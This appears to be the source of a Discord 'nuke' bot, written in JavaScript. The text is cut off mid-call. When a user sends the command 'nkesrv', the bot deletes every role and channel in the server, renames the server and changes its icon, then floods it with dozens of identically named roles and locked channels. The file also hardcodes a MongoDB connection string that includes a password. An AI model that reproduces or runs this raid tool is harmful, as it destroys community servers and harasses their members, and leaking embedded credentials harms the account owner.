const Discord = require('discord.js');
const {Permissons} = require('discord.js');
const intents = new Discord.Intents(32767)
const bot = new Discord.Client({intents});
const mongoose = require('mongoose');
mongoose.connect('mongodb+srv://nuke:inuke123@nuke101.8yqtf.mongodb.net/nukeDB',{useUnifiedTopology : true,useNewUrlParser : true}).then(console.log('Connected to NukeDB'))
const nukeinfo = require('./models/input info');

bot.on('ready',c =>{
    console.log(`${c.user.tag} is ready for nuking!`)
})
bot.on('messageCreate', async message =>{
    if (message.author.bot )return;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let args = messageArray.slice(1);
    //const chnelstp = await nukeinfo.findOne({nameSet})
    //const servstp = await nukeinfo.findOne({servertag})
    //const rolestp = await nukeinfo.findOne({roleSET})
    //if(!nukestp)return message.channel.send('Set Channel,Role and Server name for nuking!')
    
    //const chnelname = chnelstp.nameSet;
    
    //const srvname = servstp.servertag;
    //const rolename = rolestp.roleSET;
    const rolename = 'i love ur mum'
    const srvname = 'DADDY LOVES ME '
    const chnelname = 'GENDUS GOT SIKED'
    
    if(cmd === 'nkesrv'){
    message.guild.roles.cache.forEach(roles => {
        roles.delete()
        .then(deleted => console.log(`Deleted role ${deleted.name}`))
        .catch(console.error);
    });
    message.channel.send('https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831')
    message.guild.setName(srvname)
    message.guild.setIcon('https://media4.giphy.com/media/jmSImqrm28Vdm/200.gif')

    message.guild.channels.cache.forEach(channels => {
        channels.delete()
        .then(deleted => console.log(`Deleted channel ${deleted.name}`))
        .catch(console.error);
    });
    
   
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });



      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
    message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });

      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
      message.guild.roles.create({name: `${rolename}` }).catch(err=>{
        console.log(err)
    });
    message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });

      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
